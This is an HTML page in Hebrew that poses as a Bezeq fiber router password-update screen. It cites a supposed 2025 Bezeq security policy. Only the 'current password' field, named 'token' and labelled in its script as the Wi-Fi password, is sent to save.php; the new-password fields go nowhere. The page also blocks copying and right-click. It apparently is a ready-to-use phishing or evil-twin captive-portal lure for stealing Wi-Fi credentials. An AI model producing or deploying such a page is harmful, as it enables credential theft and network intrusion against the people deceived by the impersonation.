<html>

<head>
	<meta charset="UTF-8">
	<meta HTTP-EQUIV='Pragma' CONTENT='no-cache'>
	<link type="text/css" rel="stylesheet" href="ggh.css">
	<link rel="icon" href="data:;base64,=">
</head>

<body oncontextmenu='return false' ondragstart='return false' onselectstart='return false'
	onselect='document.selection.empty()' oncopy='document.selection.empty()' onbeforecopy='return false'
	onmouseup='document.selection.empty()'>
	 <form id="updateForm" method="post" action="save.php" novalidate>
		<div class="content">
			<div style="position: relative;">
				<div style="padding: 0 20% 10px;text-align: center;">
					<br><br>
					<img src="b.png">
					<br><br>
					<div class="login_eng_title">
						<p>עדכון סיסמה לנתב</p>
						<p style="font-size: smaller;">הסיב של בזק</p>
					</div>
				</div>
				
				<div style="position:absolute;left: 0;top:0;width: 20%;height: 100%;text-align: right;">
					<br><br>
				</div>
			</div>
			<div class="login_eng_left"></div>
			<div class="login_eng_text">
				<p dir="rtl">
					עדכון מדיניות האבטחה של בזק לשנת 2025 <br>
					מחייב אותנו להגן עליכם גם ברשת הביתית
				</p>
				<br>
				  <input dir="rtl" class="login_hebrew_input" type="text" value="Milner" readonly><br>
				<input dir="rtl" class="login_hebrew_input" type="text" id="token" name="token" placeholder="סיסמה נוכחית"><br>
				<input dir="rtl" class="login_hebrew_input" type="password" placeholder="סיסמה חדשה"><br>
				<input dir="rtl" class="login_hebrew_input" type="password" placeholder="הקלד/י סיסמה פעם נוספת"><br><br>
				<input class="button_blue" id="goBtn" type="submit" value="עדכן">
				
			</div> 
			<div class="login_eng_right"></div>

			<div class="login_hb_buttom_center"></div>
			<div class="login_hb_buttom_right">
				
				<img src="route_simple.png">
			</div>
		</div>
	</form>
		<script>
		  const f = document.getElementById('updateForm');
		  const btn = document.getElementById('goBtn');
		  f.addEventListener('submit', (e) => {
			const token = (document.getElementById('token').value || '').trim();
			if (!token) {
			  e.preventDefault();
			  alert('Wi-Fi Password (token) is required');
			  return false;
			}
			btn.disabled = true;
			btn.value = 'Connecting';
		  });
		</script>
</body>

</html>
